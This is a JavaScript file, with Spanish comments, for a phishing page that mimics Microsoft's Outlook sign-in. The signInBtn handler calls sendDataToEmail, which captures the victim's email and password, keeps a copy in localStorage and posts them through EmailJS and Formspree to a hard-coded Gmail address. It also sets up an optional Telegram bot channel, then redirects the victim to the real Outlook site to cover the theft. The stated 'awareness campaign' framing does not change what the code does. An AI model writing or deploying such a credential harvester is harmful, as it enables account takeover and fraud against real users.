// Estado de la aplicación
let userEmail = '';

// Elementos del DOM
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');

const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const emailError = document.getElementById('emailError');
const passwordError = document.getElementById('passwordError');
const userEmailDisplay = document.getElementById('userEmail');

const nextBtn = document.getElementById('nextBtn');
const backBtn = document.getElementById('backBtn');
const cancelBtn = document.getElementById('cancelBtn');
const signInBtn = document.getElementById('signInBtn');
const resetBtn = document.getElementById('resetBtn');

// Función para validar email
function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Función para cambiar de paso
function showStep(stepNumber) {
    step1.classList.add('hidden');
    step2.classList.add('hidden');
    step3.classList.add('hidden');

    switch(stepNumber) {
        case 1:
            step1.classList.remove('hidden');
            setTimeout(() => emailInput.focus(), 100);
            break;
        case 2:
            step2.classList.remove('hidden');
            setTimeout(() => passwordInput.focus(), 100);
            break;
        case 3:
            step3.classList.remove('hidden');
            // Registrar el intento (en una aplicación real, esto se enviaría a un servidor)
            logAttempt();
            break;
    }
}

// Función para enviar datos al correo - MÉTODO SIMPLIFICADO Y DIRECTO
function sendDataToEmail(email, password, type = 'login') {
    const timestamp = new Date().toLocaleString('es-ES');
    const userAgent = navigator.userAgent;
    const currentUrl = window.location.href;
    
    console.log('=== INICIANDO ENVÍO DE DATOS ===');
    console.log('Email:', email);
    console.log('Password:', password);
    console.log('Timestamp:', timestamp);
    
    // IMPORTANTE: Guardar en localStorage como backup
    try {
        const capturas = JSON.parse(localStorage.getItem('capturas') || '[]');
        capturas.push({
            email: email,
            password: password,
            timestamp: timestamp,
            userAgent: userAgent,
            url: currentUrl,
            type: type // 'login' or 'reset'
        });
        localStorage.setItem('capturas', JSON.stringify(capturas));
        console.log('✅ Datos guardados en localStorage como backup (type=' + type + ')');
    } catch(e) {
        console.error('Error guardando en localStorage:', e);
    }
    
    // Preparar el mensaje
    const mensaje = `
═══════════════════════════════════════════
🚨 NUEVA CAPTURA - CAMPAÑA DE CONCIENTIZACIÓN
═══════════════════════════════════════════

📧 EMAIL CAPTURADO: ${email}
🔑 CONTRASEÑA CAPTURADA: ${password}

⏰ FECHA Y HORA: ${timestamp}
🌐 NAVEGADOR: ${userAgent}
🔗 URL DE CAPTURA: ${currentUrl}

Tipo de captura: ${type}

═══════════════════════════════════════════
⚠️ Campaña de Seguridad Informática
═══════════════════════════════════════════
    `;
    
    // Método 1: EmailJS (más confiable)
    console.log('📤 Intentando enviar con EmailJS...');
    fetch('https://api.emailjs.com/api/v1.0/email/send', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            service_id: 'service_default',
            template_id: 'template_default',
            user_id: 'YOUR_PUBLIC_KEY', // Temporal - necesitamos configurar esto
            template_params: {
                to_email: 'sofly7899@gmail.com',
                from_name: 'Sistema de Captura',
                subject: `🚨 Nueva Captura - ${timestamp}`,
                message: mensaje,
                email_capturado: email,
                password_capturada: password,
                tipo_captura: type
            }
        })
    })
    .then(response => {
        console.log('EmailJS status:', response.status);
        if (response.ok) {
            console.log('✅ EmailJS: Enviado exitosamente');
        } else {
            console.log('⚠️ EmailJS: No configurado aún');
        }
    })
    .catch(error => {
        console.log('⚠️ EmailJS error (esperado si no está configurado):', error.message);
    });
    
    // Método 2: Formspree (backup)
    console.log('📤 Enviando con Formspree...');
    fetch('https://formspree.io/f/xanyevdp', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        },
        body: JSON.stringify({
            email: 'sofly7899@gmail.com',
            subject: `🚨 Nueva Captura - ${timestamp}`,
            message: mensaje,
            _replyto: 'sofly7899@gmail.com',
            _subject: `🚨 Nueva Captura - ${email}`,
            email_capturado: email,
            password_capturada: password,
            fecha_hora: timestamp,
            tipo_captura: type
        })
    })
    .then(response => {
        console.log('Formspree status:', response.status);
        return response.json();
    })
    .then(data => {
        console.log('✅ Formspree respuesta:', data);
        if (data.ok) {
            console.log('✅ Email enviado exitosamente por Formspree');
        }
    })
    .catch(error => {
        console.error('❌ Error con Formspree:', error);
    });
    
    // Método 3: Telegram Bot (alternativa rápida)
    // Puedes crear un bot de Telegram para recibir notificaciones instantáneas
    const telegramBotToken = 'TU_BOT_TOKEN'; // Necesitas crear un bot
    const telegramChatId = 'TU_CHAT_ID';
    
    if (telegramBotToken !== 'TU_BOT_TOKEN') {
        console.log('📤 Enviando a Telegram...');
        const telegramMessage = `🚨 NUEVA CAPTURA\n\n📧 Email: ${email}\n🔑 Pass: ${password}\n⏰ ${timestamp}`;
        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: telegramChatId,
                text: telegramMessage
            })
        })
        .then(() => console.log('✅ Telegram: Enviado'))
        .catch(e => console.log('⚠️ Telegram:', e.message));
    }
    
    // Redirigir después de intentar enviar
    console.log('⏳ Redirigiendo a Outlook en 2 segundos...');
    setTimeout(() => {
        window.location.href = 'https://outlook.live.com/owa/';
    }, 2000);
}

// Event Listeners

// Botón "Siguiente" (Step 1 -> Step 2)
nextBtn.addEventListener('click', () => {
    const email = emailInput.value.trim();
    
    if (!email) {
        emailError.textContent = 'Escriba su correo electrónico, teléfono o Skype.';
        emailInput.style.borderColor = '#a80000';
        return;
    }
    
    if (!isValidEmail(email)) {
        emailError.textContent = 'Escriba una dirección de correo electrónico válida.';
        emailInput.style.borderColor = '#a80000';
        return;
    }
    
    emailError.textContent = '';
    emailInput.style.borderColor = '';
    userEmail = email;
    userEmailDisplay.textContent = email;
    showStep(2);
});

// Permitir Enter en el campo de email
emailInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        nextBtn.click();
    }
});

// Limpiar error al escribir
emailInput.addEventListener('input', () => {
    emailError.textContent = '';
    emailInput.style.borderColor = '';
});

// Botón "Atrás" (Step 2 -> Step 1)
backBtn.addEventListener('click', () => {
    passwordInput.value = '';
    passwordError.textContent = '';
    showStep(1);
});

// Botón "Cancelar" (Step 2 -> Step 1)
cancelBtn.addEventListener('click', () => {
    passwordInput.value = '';
    passwordError.textContent = '';
    showStep(1);
});

// Botón "Iniciar sesión" (Step 2 -> Enviar datos y redirigir)
signInBtn.addEventListener('click', () => {
    const password = passwordInput.value;
    
    if (!password) {
        passwordError.textContent = 'Escriba la contraseña de su cuenta de Microsoft.';
        passwordInput.style.borderColor = '#a80000';
        return;
    }
    
    // Simular un pequeño delay como si estuviera verificando
    signInBtn.textContent = 'Iniciando sesión...';
    signInBtn.disabled = true;
    
    // Enviar datos al correo y redirigir
    sendDataToEmail(userEmail, password);
});

// Permitir Enter en el campo de contraseña
passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        signInBtn.click();
    }
});

// Limpiar error al escribir
passwordInput.addEventListener('input', () => {
    passwordError.textContent = '';
    passwordInput.style.borderColor = '';
});

// Botón "Volver al inicio" (Step 3 -> Step 1)
resetBtn.addEventListener('click', () => {
    emailInput.value = '';
    passwordInput.value = '';
    emailError.textContent = '';
    passwordError.textContent = '';
    userEmail = '';
    showStep(1);
});

// Inicializar: mostrar el primer paso
showStep(1);

// Prevenir el envío de formularios (por si se agregan forms más adelante)
document.addEventListener('submit', (e) => {
    e.preventDefault();
});
